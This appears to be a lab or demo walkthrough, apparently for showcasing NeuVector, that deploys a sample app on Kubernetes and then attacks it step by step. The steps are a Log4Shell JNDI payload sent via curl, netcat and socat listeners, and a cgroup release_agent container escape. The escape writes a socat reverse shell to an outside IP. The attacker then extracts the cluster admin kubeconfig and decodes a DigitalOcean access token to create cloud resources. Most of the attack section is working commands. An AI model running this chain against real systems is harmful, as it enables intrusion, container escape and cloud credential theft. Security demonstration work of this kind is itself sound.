# Installing the Kubernetes application
1. Login into your victim machine via ssh with username and passwort
2. Switch to into the yaml directory
```
cd yaml
```
3. apply the the needed yaml files to deploy the sample application and the ingress to access it.
```
kubectl apply -f ~/yaml/sample_app_deployment.yml
```

```
kubectl apply -f ~/yaml/sample_app_service_ingress.yml
```
4. Access the application via Browser. You can get the URL from the ingress yaml file.
```
cat ~/yaml/sample_app_service_ingress.yml
```
# Installing NeuVector
```
helm repo add neuvector https://neuvector.github.io/neuvector-helm/
```
```
helm install neuvector neuvector/core \
  --namespace cattle-neuvector-system \
  -f ~/yaml/neuvector-values.yaml \
  --version 2.6.0 \
  --create-namespace
```

# Start the Attack
1. First open netcat in the first terminal to receive remote shells
```
sudo nc -lvnp 443
```
## Then open socat in the 2nd terminal
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Start the LDAP Server on the 3rd terminal
```
sudo python3 poc.py --userip <puplic IP> --webport 80 --lport 443 &
```
+ Tells the client please load a java class from my webserver

```
curl http://sample-app.default.<PUPLIC IP VICTIM>.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://<PUPLIC IP ATTACKER:1389/a}'
```

## Working inside of the container
+ do a `ps`
+ do a `ls`
+ Dry to download `kubectl`
```
curl -LO --insecure "https://dl.k8s.io/release/$(curl -L -s --insecure https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```
+ Execute `kubectl get pods`
+ Let's try something else and list the Linux capabilities of the container
```
capsh --print
```

+ Let's try to change this by exploiting a Kernel vulnerability:
```
unshare -UrmC bash
capsh --print
```
# Break out of the container with an additional vulnerability
+ manipulate the c group release agent
```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
+ we mount the cgroup controller to /tmp/cgroup
+ and create a cgroup called x
+ Now we configure the notification service of the release agent 

```
echo 1 > /tmp/cgrp/x/notify_on_release
```
```
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```
```
echo $host_path
```
+Set the release agent to execute /{overlay_fs_host_path}/cmd on the host (/cmd inside of the container) when the cgroup is released

```
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

```
echo '#!/bin/bash' > /cmd
echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.68.166.70:4444" >> /cmd
chmod a+x /cmd
```
+ Run echo in the cgroup, which will directly exit and trigger the release agent cmd
```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

# Execute commands on the new host terminal

```
ls -al
whoami
docker ps
```

## Get access to the K8s API
```
docker cp kubelet:/usr/local/bin/kubectl /usr/bin/
```
+ Get kubeconfig
```
kubectl --kubeconfig $(docker inspect kubelet --format '{{ range .Mounts }}{{ if eq .Destination "/etc/kubernetes" }}{{ .Source }}{{ end }}{{ end }}')/ssl/kubecfg-kube-node.yaml get configmap -n kube-system full-cluster-state -o json | jq -r .data.\"full-cluster-state\" | jq -r .currentState.certificatesBundle.\"kube-admin\".config | sed -e "/^[[:space:]]*server:/ s_:.*_: \"https://127.0.0.1:6443\"_" > kubeconfig_admin.yaml
```
```
export KUBECONFIG=$(pwd)/kubeconfig_admin.yaml
```


+ Now we are admin in the Kubernetes cluster 
```
kubectl get pods -A
```
## Get Digital Ocean Token
```
kubectl get deployments -A
```

```
kubectl get secrets -n kube-system
```
+ Get the cloud provider token
```
do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
echo $do_token
```
+ Login into digital ocen
```
doctl auth init -t $do_token
```

+ create a compute ressource 
```
doctl compute droplet create hacking-demo --region fra1 --size s-1vcpu-1gb --image ubuntu-20-04-x64 --wait
```
+ show machine in the digitial ocean dashboard

+ After the machine is created please delete the resource
```
doctl compute droplet delete hacking-demo -f
```


